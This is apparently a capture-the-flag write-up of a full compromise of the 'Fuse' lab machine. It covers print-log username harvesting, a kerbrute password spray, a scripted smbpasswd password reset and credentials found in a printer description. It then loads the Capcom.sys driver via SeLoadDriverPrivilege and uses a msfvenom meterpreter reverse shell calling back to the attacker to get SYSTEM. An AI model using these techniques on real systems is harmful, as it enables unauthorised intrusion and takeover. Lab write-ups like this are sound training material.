## Website Enumeration

When we visit http://10.10.10.193, we are redirected to fuse.fabricorp.local, so we'll need to add that url to /etc/hosts. Once we've done this, we can visit http://fuse.fabricorp.local, and we see that the PaperCut Print Logger is running. Looking through the print logs, we can get a username list:

*sthompson*
*pmerton*
*tlavel*
*bhult*
*administrator*
*bnielson*

Note: bnielson was found in the Document Name section, rather than the print job creator section.

We also see a document on the website named "Fabricorp01.docx" that looks like it may be a password, so we'll use kerbute to password spray:

```
kerbrute passwordspray --dc 10.10.10.193 -d FABRICORP users.txt Fabricorp01 -v

...
2020/06/18 08:16:39 >  [!] bnielson@FABRICORP:Fabricorp01 - [Root cause: KDC_Error] KDC_Error: AS Exchange Error: kerberos error response from KDC: KRB Error: (37) KRB_AP_ERR_SKEW Clock skew too great
2020/06/18 08:16:39 >  [!] sthompson@FABRICORP:Fabricorp01 - Invalid password
2020/06/18 08:16:39 >  [!] tlavel@FABRICORP:Fabricorp01 - [Root cause: KDC_Error] KDC_Error: AS Exchange Error: kerberos error response from KDC: KRB Error: (37) KRB_AP_ERR_SKEW Clock skew too great
2020/06/18 08:16:39 >  [!] bhult@FABRICORP:Fabricorp01 - [Root cause: KDC_Error] KDC_Error: AS Exchange Error: kerberos error response from KDC: KRB Error: (37) KRB_AP_ERR_SKEW Clock skew too great
...
```

It's interesting that we're getting a different error for tlavel, bnielson and bhult. If we do a quick udp nmap scan, we see that port 123 is open, so we can sync our time to the server:

```
...
123/udp   open          ntp          udp-response ttl 127 NTP v3
...
```

We'll use ntpdate to do this:

```
ntpdate -u fabricorp.local

18 Jun 08:37:16 ntpdate[17686]: step time server 10.10.10.193 offset +1042.801192 sec
```

Now, if we run kerbrute again, we get the following valid logins:

```
2020/06/18 08:37:30 >  [+] VALID LOGIN:  tlavel@FABRICORP:Fabricorp01
2020/06/18 08:37:30 >  [+] VALID LOGIN:  bhult@FABRICORP:Fabricorp01
2020/06/18 08:37:30 >  [+] VALID LOGIN:  bnielson@FABRICORP:Fabricorp01
```

We can try logging into different services (smb/rpc/winrm) with these credentials, but they're all either expired, or need to be changed on login, since the users haven't logged in for the first time yet. We can, however, use smbpasswd to change the password remotely:

Note: There's a ~20 second window before the password is reset to its default, so we have to be quick. We can use the following script:

reset.py:
```
from pwn import *
import sys

if len(sys.argv) < 3:
        print('Usage: ' + sys.argv[0] + ' <username> <new password>')
        sys.exit()

username = sys.argv[1]
password = sys.argv[2]

io = process(['smbpasswd', '-U', username, '-r', '10.10.10.193'])
io.recvuntil('Old SMB password:')
io.sendline('Fabricorp01')
io.recvuntil('New SMB password:')
io.sendline(password)
io.recvuntil('Retype new SMB password:')
io.sendline(password)
trash = io.recvline()
finish = io.recvline()
success(str(finish)[2:-3])
```

To run the script:

```
python3 script.py bhult Xbx1233
[+] Starting local process '/usr/bin/smbpasswd': pid 29712
[+] Password changed for user bhult
```

After running the script against our target, we can quickly log in to smb and rpc to further enumerate the machine. None of these logins want to work with evil-winrm, so they may not be in the "Remote Management" group.

## Enumeration with RPCClient

We'll first see if we have any new users:

```
```

Then, we'll check the groups on the box:

```
rpcclient $> enumdomgroups                                
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                          
group:[Domain Admins] rid:[0x200]                         
group:[Domain Users] rid:[0x201]                          
group:[Domain Guests] rid:[0x202]                         
group:[Domain Computers] rid:[0x203]                                                                                 
group:[Domain Controllers] rid:[0x204]                                                                               
group:[Schema Admins] rid:[0x206]                                                                                    
group:[Enterprise Admins] rid:[0x207]                                                                                
group:[Group Policy Creator Owners] rid:[0x208]                                                                      
group:[Read-only Domain Controllers] rid:[0x209]                                                                     
group:[Cloneable Domain Controllers] rid:[0x20a]          
group:[Protected Users] rid:[0x20d]                       
group:[Key Admins] rid:[0x20e]                            
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[IT_Accounts] rid:[0x644]       
```

IT_Accounts looks interesting, so we'll dig into that:

```
rpcclient $> querygroupmem 0x644
        rid:[0x450] attr:[0x7]
        rid:[0x641] attr:[0x7]
...
rpcclient $> queryuser 0x450                              
        User Name   :   svc-print
...
rpcclient $> queryuser 0x641                              
        User Name   :   sthompson
```

Now that we have two users that we're most likely meant to go for, we'll see what we can find out about the printer on the website, since it had a file printed with a password in the name:

```
rpcclient $> getprinter HP-MFT01                                                                                                                                                                                                          
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]
```

Nice, looks like we have a password in the description!

**$fab@s3Rv1ce$1**

Since it looks like a printer password, we'll try logging into svc-print using evil-winrm:

```
$ evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i 10.10.10.193
...
*Evil-WinRM* PS C:\Users\svc-print\Documents> 
```

## Internal Enumeration

From here, we can check our privileges:

```
$ whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

It looks like we're in the Print Operators group, as we have the SeLoadDriverPrivilege privilege, so we can escalate!

We'll use a couple of exploits for this:

Explanation of vulnerability:

https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#seloaddriverprivilege

Capcom.sys:

https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54

Driver Loader:

https://github.com/TarlogicSecurity/EoPLoadDriver

Capcom SYSTEM Priv-esc Exploit:

https://github.com/tandasat/ExploitCapcom

We'll need to fire up a Windows VM with Visual Studio to compile these correctly.

Before we compile the exploit, we need to create a reverse shell with msfvenom that we can tell the exploit to call:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1234 -f exe > shell.exe
```

Now, we need to edit ExploitCapcom.cpp slightly, and change the TCHAR CommandLine[] in the function LaunchShell() to the following:

```
TCHAR CommandLine[] = TEXT("C:\\.tmp\\shell.exe");
```

## Compiling our Exploit

In a nutshell, we can load the ExploitCapcom .sln file into Visual Studio, and compile it first by clicking Build -> Build Solution. We'll grab the .exe it creates and move it to our attacking machine. Then, we'll remove ExploitCapcom.cpp from the Source Files in the right pane, and add our eoploaddriver.cpp file to the Source Files. We'll now build the solution again, and grab our new .exe file. 

Note: Visual Studio was looking for a stdafx.h file to pull in, and the header file for ExploitCapcom was sufficient to also build our eoploaddriver exploit.

Once we have all of the files, we can upload then to the box with evil-winrm.

**Checklist:**

*Capcom.sys*
*ExploitCapcom.exe*
*eoploaddriver.exe*
*shell.exe*

## Getting SYSTEM

Now that we have all of the files uploaded to the victim machine, we can load our driver:

```
$ eoploaddriver.exe System\CurrentControlSet\MyService C:\.tmp\Capcom.sys
...
[+] Enabling SeLoadDriverPrivilege                                          
[+] SeLoadDriverPrivilege Enabled                                           [+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
NTSTATUS: 00000000, WinError: 0
```

Now that we have it loaded, we'll need to open a Metasploit listener:

```
$ msfconsole
$ use exploit/multi/handler
$ set LHOST tun0
$ set LPORT 1234
$ exploit -j
```

Finally, we'll run our exploit:

```
$ ./ExploitCapcom.exe
[*] Capcom.sys exploit                                                                                               
[*] Capcom.sys handle was obtained as 0000000000000064                                                               
[*] Shellcode was placed at 000002571D360008                                                                         
[+] Shellcode was executed                                                                                           
[+] Token stealing was successful                                                                                    
[+] The SYSTEM shell was launched                                                                                    
[*] Press any key to exit this program 
```

Now, we just catch our shell!

```
meterpreter > shell                                       
Process 4708 created.

C:\.tmp>whoami                                            
whoami                                                    
nt authority\system
```

Voila, we have a system level shell!
